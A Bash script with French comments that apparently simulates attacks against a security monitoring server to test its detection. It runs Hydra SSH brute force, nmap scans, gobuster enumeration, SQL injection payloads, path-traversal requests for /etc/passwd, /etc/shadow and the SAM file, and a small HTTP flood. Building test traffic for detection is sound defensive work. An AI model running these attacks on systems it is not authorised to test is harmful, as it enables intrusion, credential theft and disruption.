#!/bin/bash
################################################################################
# attacks.sh
# Script de simulation d'attaques pour tester le SOC IA
#
# À exécuter depuis Kali Linux vers le serveur Ubuntu (SOC)
# Usage: ./attacks.sh <target_ip>
################################################################################

set -e

# Couleurs pour l'affichage
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Vérification des arguments
if [ -z "$1" ]; then
    echo -e "${RED}Usage: $0 <target_ip>${NC}"
    echo "Example: $0 192.168.1.10"
    exit 1
fi

TARGET_IP=$1
LOG_FILE="attacks_$(date +%Y%m%d_%H%M%S).log"

echo -e "${BLUE}"
cat << "EOF"
╔══════════════════════════════════════════════════════════════╗
║              SOC IA - SIMULATION D'ATTAQUES                  ║
╚══════════════════════════════════════════════════════════════╝
EOF
echo -e "${NC}"

echo -e "${YELLOW}Target: $TARGET_IP${NC}"
echo -e "${YELLOW}Log file: $LOG_FILE${NC}"
echo ""

# Fonction de logging
log_attack() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" | tee -a "$LOG_FILE"
}

# Fonction d'attente
wait_between_attacks() {
    echo -e "${BLUE}Attente de 5 secondes...${NC}"
    sleep 5
}

################################################################################
# ATTAQUE 1: BRUTE FORCE SSH
################################################################################
attack_ssh_bruteforce() {
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}ATTAQUE 1: BRUTE FORCE SSH${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
    
    log_attack "START: SSH Brute Force Attack"
    
    # Vérifier si hydra est installé
    if ! command -v hydra &> /dev/null; then
        echo -e "${RED}hydra n'est pas installé. Installation...${NC}"
        sudo apt-get update && sudo apt-get install -y hydra
    fi
    
    # Créer une petite wordlist de test
    echo -e "${YELLOW}Création de la wordlist...${NC}"
    cat > /tmp/passwords.txt << 'EOL'
admin
password
123456
root
toor
kali
EOL
    
    echo -e "${YELLOW}Lancement de l'attaque Hydra...${NC}"
    echo -e "${RED}Attention: Cette attaque va générer des tentatives de connexion échouées${NC}"
    
    # Attaque SSH brute force (limité à 6 essais pour ne pas bloquer le serveur)
    hydra -l admin -P /tmp/passwords.txt ssh://$TARGET_IP -t 4 -V 2>&1 | tee -a "$LOG_FILE" || true
    
    log_attack "END: SSH Brute Force Attack"
    echo -e "${GREEN}✓ Attaque SSH Brute Force terminée${NC}"
}

################################################################################
# ATTAQUE 2: PORT SCAN (NMAP)
################################################################################
attack_port_scan() {
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}ATTAQUE 2: PORT SCAN (NMAP)${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
    
    log_attack "START: Port Scan Attack"
    
    if ! command -v nmap &> /dev/null; then
        echo -e "${RED}nmap n'est pas installé. Installation...${NC}"
        sudo apt-get update && sudo apt-get install -y nmap
    fi
    
    echo -e "${YELLOW}Scan de ports classique...${NC}"
    nmap -sV -sC -p 1-1000 $TARGET_IP 2>&1 | tee -a "$LOG_FILE" || true
    
    echo -e "${YELLOW}Scan SYN (stealth)...${NC}"
    sudo nmap -sS -p 22,80,443,3306,5432 $TARGET_IP 2>&1 | tee -a "$LOG_FILE" || true
    
    log_attack "END: Port Scan Attack"
    echo -e "${GREEN}✓ Attaque Port Scan terminée${NC}"
}

################################################################################
# ATTAQUE 3: FUZZING WEB (GOBUSTER)
################################################################################
attack_web_fuzzing() {
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}ATTAQUE 3: FUZZING WEB (GOBUSTER)${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
    
    log_attack "START: Web Fuzzing Attack"
    
    if ! command -v gobuster &> /dev/null; then
        echo -e "${RED}gobuster n'est pas installé. Installation...${NC}"
        sudo apt-get update && sudo apt-get install -y gobuster
    fi
    
    # Créer une wordlist personnalisée
    cat > /tmp/web_paths.txt << 'EOL'
admin
administrator
wp-admin
phpmyadmin
config
.git
.env
backup
uploads
login
dashboard
api
test
dev
EOL
    
    echo -e "${YELLOW}Énumération de répertoires web...${NC}"
    gobuster dir -u http://$TARGET_IP -w /tmp/web_paths.txt -t 10 -q 2>&1 | tee -a "$LOG_FILE" || true
    
    log_attack "END: Web Fuzzing Attack"
    echo -e "${GREEN}✓ Attaque Web Fuzzing terminée${NC}"
}

################################################################################
# ATTAQUE 4: SQL INJECTION (SIMULATION)
################################################################################
attack_sql_injection() {
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}ATTAQUE 4: SQL INJECTION (SIMULATION)${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
    
    log_attack "START: SQL Injection Simulation"
    
    echo -e "${YELLOW}Tentatives d'injection SQL...${NC}"
    
    # Payloads SQL injection courants
    PAYLOADS=(
        "' OR '1'='1"
        "' OR '1'='1' --"
        "admin' --"
        "' UNION SELECT NULL--"
        "1' AND 1=1 --"
    )
    
    for payload in "${PAYLOADS[@]}"; do
        encoded_payload=$(echo -n "$payload" | jq -sRr @uri)
        echo -e "${YELLOW}Envoi payload: $payload${NC}"
        curl -s "http://$TARGET_IP/login?username=$encoded_payload&password=test" \
             -H "User-Agent: SQLMap/1.0" 2>&1 | head -n 5 | tee -a "$LOG_FILE" || true
        sleep 1
    done
    
    log_attack "END: SQL Injection Simulation"
    echo -e "${GREEN}✓ Attaque SQL Injection terminée${NC}"
}

################################################################################
# ATTAQUE 5: DIRECTORY TRAVERSAL
################################################################################
attack_directory_traversal() {
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}ATTAQUE 5: DIRECTORY TRAVERSAL${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
    
    log_attack "START: Directory Traversal Attack"
    
    echo -e "${YELLOW}Tentatives de path traversal...${NC}"
    
    PATHS=(
        "../../../../etc/passwd"
        "../../../etc/shadow"
        "..\\..\\..\\windows\\system32\\config\\sam"
        "....//....//....//etc/passwd"
    )
    
    for path in "${PATHS[@]}"; do
        echo -e "${YELLOW}Test: $path${NC}"
        curl -s "http://$TARGET_IP/download?file=$path" 2>&1 | head -n 5 | tee -a "$LOG_FILE" || true
        sleep 1
    done
    
    log_attack "END: Directory Traversal Attack"
    echo -e "${GREEN}✓ Attaque Directory Traversal terminée${NC}"
}

################################################################################
# ATTAQUE 6: DDoS SIMULATION (LÉGER)
################################################################################
attack_ddos_simulation() {
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}ATTAQUE 6: DDoS SIMULATION (LÉGER)${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
    
    log_attack "START: DDoS Simulation"
    
    echo -e "${YELLOW}Envoi de requêtes multiples (HTTP Flood)...${NC}"
    echo -e "${RED}Mode léger: 50 requêtes seulement${NC}"
    
    for i in {1..50}; do
        curl -s "http://$TARGET_IP/" -H "X-Attack: DDoS-Test-$i" &
    done
    wait
    
    log_attack "END: DDoS Simulation"
    echo -e "${GREEN}✓ Attaque DDoS Simulation terminée${NC}"
}

################################################################################
# MENU PRINCIPAL
################################################################################
show_menu() {
    echo -e "\n${BLUE}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║              MENU DES ATTAQUES                               ║${NC}"
    echo -e "${BLUE}╚══════════════════════════════════════════════════════════════╝${NC}\n"
    echo -e "${YELLOW}1.${NC} SSH Brute Force (Hydra)"
    echo -e "${YELLOW}2.${NC} Port Scan (Nmap)"
    echo -e "${YELLOW}3.${NC} Web Fuzzing (Gobuster)"
    echo -e "${YELLOW}4.${NC} SQL Injection (Simulation)"
    echo -e "${YELLOW}5.${NC} Directory Traversal"
    echo -e "${YELLOW}6.${NC} DDoS Simulation (Léger)"
    echo -e "${YELLOW}7.${NC} ${GREEN}TOUT EXÉCUTER${NC}"
    echo -e "${YELLOW}0.${NC} Quitter"
    echo ""
}

run_all_attacks() {
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}EXÉCUTION DE TOUTES LES ATTAQUES${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}"
    
    attack_ssh_bruteforce
    wait_between_attacks
    
    attack_port_scan
    wait_between_attacks
    
    attack_web_fuzzing
    wait_between_attacks
    
    attack_sql_injection
    wait_between_attacks
    
    attack_directory_traversal
    wait_between_attacks
    
    attack_ddos_simulation
    
    echo -e "\n${GREEN}═══════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}TOUTES LES ATTAQUES TERMINÉES${NC}"
    echo -e "${GREEN}═══════════════════════════════════════════════════════${NC}\n"
}

################################################################################
# BOUCLE PRINCIPALE
################################################################################
while true; do
    show_menu
    read -p "Choisissez une option: " choice
    
    case $choice in
        1)
            attack_ssh_bruteforce
            ;;
        2)
            attack_port_scan
            ;;
        3)
            attack_web_fuzzing
            ;;
        4)
            attack_sql_injection
            ;;
        5)
            attack_directory_traversal
            ;;
        6)
            attack_ddos_simulation
            ;;
        7)
            run_all_attacks
            ;;
        0)
            echo -e "${GREEN}Au revoir!${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Option invalide!${NC}"
            ;;
    esac
    
    echo -e "\n${BLUE}Appuyez sur ENTER pour continuer...${NC}"
    read
done
